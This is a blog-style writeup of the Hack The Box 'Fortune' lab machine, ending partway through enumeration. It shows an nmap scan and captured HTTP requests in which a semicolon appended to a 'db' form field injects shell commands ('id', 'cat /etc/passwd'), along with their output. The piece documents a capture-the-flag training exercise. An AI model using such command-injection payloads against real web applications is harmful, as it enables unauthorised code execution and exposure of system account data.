---
layout: post
title:  "Hack The Box: 'Fortune' Writeup"
image: ''
date:   2019-08-05 00:09:53
tags:
- hackthebox
- pkcs12 certificate
- RCE
- nfs share
- pgadmin4
- sqlite3
- crypto

description: ''
categories:
- Hack The Box
---

<style>
	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.fortune-img {
		max-width: 75%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}
</style>

<head>
  <!-- add the button style & script -->
  <link rel="stylesheet" href="/assets/css/applause-button.css" />
  <script src="/assets/js/applause-button.js"></script>
</head>
<body>
  <!-- add the button! -->
  <applause-button style="width: 58px; height: 58px;"/>
</body>

<img src="/assets/img/writeups/HTB-FORTUNE/HTB-FORTUNE-BADGE.PNG" class="fortune-img" alt="Hack The Box - Fortune">

<p><br></p>
### TL;DR 
There might not necessarily be anything "new" in this box if you've done all of the previous ones, but it's my absolute personal favorite. Thank you so much <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a> for creating it. I was so sad when it retired! 😢
<p><br></p>

### Overview

The `Fortune` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a>) is a retired 50 point OpenBSD machine with some pretty interesting parts to it. If you have completed all of the previous boxes on HackTheBox, then `Fortune` should be pretty simple, as there is nothing particularly new introduced.
<p><br></p>

The box starts with simple web enumeration to locate RCE found in the site's `db` variable, which occurs when a semi colon (;) is appended to the end of the `db`. Next, some files are located via the RCE that can be used to create a PKCS12 certificate which permits access to port 443. From there, an SSH key is located to access the user called `nfsuser` and escalate to the user `charlie` by mounting a newly found nfs share and using `su` to access `charlie` with a local user that has the same UID. SSH keys for `charlie` are then used to access the user via SSH and enumerate further.
<p><br></p>

Finally, there is a `pgadmin4` database running on the box which contains hashes for the root password. A file called `crypto.py` is utilized for `pgadmin4's` encoding/decoding process, and can be used here to decode the root password and ultimately grab the flag.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@rattLR:~/HTB-FORTUNE# nmap -sC -sV -A -Pn 10.10.10.127

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 11:27 EST
Nmap scan report for 10.10.10.127
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (EdDSA)
80/tcp  open  http       syn-ack OpenBSD httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https? syn-ack
|_ssl-date: TLS randomness does not represent time
</code></pre></div></div>

So, it appears port `443` is HTTPS (as expected), but it requires an SSL certificate to access it. I'll leave it alone for now because of this. However, port `80` proves to be quite interesting.
<p><br></p>

### Web Enumeration

Here's what I discovered upon navigating to `http://10.10.10.127/` in my browser:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-homepage.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

Hmm... 

Let's try capturing a request with `Burp Suite`!

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

db=fortunes
```

The `db` variable looks pretty spicy! 🌶️

After running `wfuzz`, I discovered I could append a semi colon (;) to `db` and execute commands on the box, like so:

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

db=fortunes; id
```

And the response:
```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Date: Wed, 24 Jul 2019 12:27:19
<!DOCTYPE html>
<html>
<head>
<title>Your fortune</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
<h2>Your fortune is:</h2>
<p><pre>

uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)


</pre><p>
<p>Try <a href='/'>again</a>!</p>
</body>
```

Nice! We have code execution. Let's have a look around to see what else we can find. 
<p><br></p>

### Enumerating Users & Obtaining User.txt

(Shortened output for readability):

```
db=fortunes;cat /etc/passwd

charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

Well, well, well... It would appear we have three different users here. They are `charlie`, `bob`, and `nfsuser`. Immediately, `nfsuser` appears interesting to me given the naming convention. The username `nfsuser` can easily be attributed to an `nfs share`! Now, this is great and all, but I still don't know how to access these users, nor am I able to add my own `ssh` keys..
<p><br></p>

